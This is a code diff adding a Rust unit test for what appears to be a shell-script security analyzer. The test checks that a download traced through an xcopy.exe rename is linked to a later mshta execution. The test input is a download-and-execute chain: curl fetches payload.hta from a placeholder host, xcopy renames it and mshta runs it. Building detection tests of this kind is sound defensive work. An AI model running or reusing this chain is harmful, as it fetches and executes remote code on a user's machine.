@@ -22931,6 +22931,28 @@ mshta renamed.hta"#,
     }
 
     #[test]
+    fn xcopy_exe_pipeline_preserves_download_source_for_later_execution() {
+        let report = crate::analyze(
+            br#"curl -o original.hta https://xcopy-exe-pipe.example/payload.hta
+echo F | xcopy.exe /y original.hta renamed.hta
+mshta renamed.hta"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta renamed.hta"
+                            && url == "https://xcopy-exe-pipe.example/payload.hta"
+                )
+            }),
+            "xcopy.exe pipeline copied download was not linked on later execution: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn move_preserves_download_source_for_later_execution() {
         let report = crate::analyze(
             br#"curl -o original.hta https://move-download.example/payload.hta
